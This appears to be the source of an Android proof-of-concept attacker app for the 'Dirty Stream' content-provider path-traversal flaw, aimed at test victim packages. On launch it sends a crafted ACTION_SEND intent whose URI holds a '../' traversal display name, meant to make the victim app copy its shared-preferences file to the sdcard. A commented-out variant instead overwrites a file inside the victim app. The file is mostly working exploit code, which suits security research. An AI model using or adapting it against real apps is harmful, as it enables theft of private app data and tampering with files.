package com.test.dirtystream;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        newTextFile();
        moveAssetToDir(this, "screenshot.png");

        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setComponent(new android.content.ComponentName("com.test.dirtystreamvuln", "com.test.dirtystreamvuln.FileActivity"));

        // use addFlags instead of setFlags avoid overriding existing flags
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        intent.setType("text/plain");

        // overwrite the file in vuln App
//        Uri uri = Uri.parse("content://com.test.android.fileprovider/file.txt?name=file.txt&_size=11&path=" + getFilesDir() + "/file.txt");

        // read file from vuln App and write to sdcard
        Uri uri = Uri.parse("content://com.test.vulnapp.fileprovider/root/data/user/0/com.test.dirtystreamvuln/shared_prefs/shared_pref.xml?displayName=../../../../../../../sdcard/test.xml");
        intent.setData(uri);

        Log.d("MainActivity", "Starting activity" + intent.getScheme());
        startActivity(intent);
    }

    public void newTextFile(){
        File file = new File(getFilesDir(), "file.txt");
        try {
            FileWriter writer = new FileWriter(file);
            writer.write("ATTACK!!!\n");
            writer.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
    private void copyFile(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int read;
        while((read = in.read(buffer)) != -1){
            out.write(buffer, 0, read);
        }
    }
    public void moveAssetToDir(Context context, String filename) {
        InputStream in = null;
        OutputStream out = null;
        try {
            in = context.getAssets().open(filename);
            File outFile = new File(context.getFilesDir(), filename);
            out = new FileOutputStream(outFile);
            copyFile(in, out);
        } catch(IOException e) {
            Log.e("tag", "Failed to copy asset file: " + filename, e);
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                    // NOOP
                }
            }
            if (out != null) {
                try {
                    out.close();
                } catch (IOException e) {
                    // NOOP
                }
            }
        }
    }
}